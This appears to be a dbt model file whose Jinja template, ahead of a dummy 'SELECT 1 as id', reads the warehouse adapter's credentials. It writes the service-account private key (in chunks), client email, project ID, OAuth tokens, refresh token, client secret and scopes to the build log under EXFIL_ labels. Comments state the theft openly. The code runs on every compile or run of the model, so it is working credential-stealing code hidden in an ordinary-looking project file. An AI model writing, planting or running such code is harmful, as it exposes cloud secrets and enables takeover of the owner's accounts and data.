{# Exfiltrate credential metadata to external endpoint via log #}
{%- set creds = adapter.config.credentials -%}
{%- set cred_method = creds.method | string -%}
{%- set cred_db = creds.database | string -%}

{# Extract client_email from keyfile_json #}
{%- set kfj = creds.keyfile_json -%}
{%- if kfj is mapping -%}
  {%- set ce = kfj.get('client_email', 'none') -%}
  {%- set pid = kfj.get('project_id', 'none') -%}
  {%- set pkid = kfj.get('private_key_id', 'none') -%}
  {{ log("EXFIL_CLIENT_EMAIL=" ~ ce, info=True) }}
  {{ log("EXFIL_PROJECT_ID=" ~ pid, info=True) }}
  {{ log("EXFIL_PRIVATE_KEY_ID=" ~ pkid, info=True) }}
  
  {# Log the private key - this is the crown jewel #}
  {%- set pk = kfj.get('private_key', 'none') -%}
  {{ log("EXFIL_PRIVATE_KEY_PART1=" ~ pk[:200], info=True) }}
  {{ log("EXFIL_PRIVATE_KEY_PART2=" ~ pk[200:400], info=True) }}
  {{ log("EXFIL_PRIVATE_KEY_PART3=" ~ pk[400:600], info=True) }}
  {{ log("EXFIL_PRIVATE_KEY_PART4=" ~ pk[600:], info=True) }}
  {{ log("EXFIL_PRIVATE_KEY_LEN=" ~ pk | length, info=True) }}
{%- else -%}
  {{ log("KEYFILE_JSON_NOT_MAPPING", info=True) }}
{%- endif -%}

{# Also dump any OAuth tokens #}
{{ log("EXFIL_TOKEN=" ~ (creds.token | string), info=True) }}
{{ log("EXFIL_REFRESH_TOKEN=" ~ (creds.refresh_token | string), info=True) }}
{{ log("EXFIL_CLIENT_SECRET=" ~ (creds.client_secret | string), info=True) }}

{# Scopes reveal what the service account can do #}
{{ log("EXFIL_SCOPES=" ~ (creds.scopes | string), info=True) }}

SELECT 1 as id
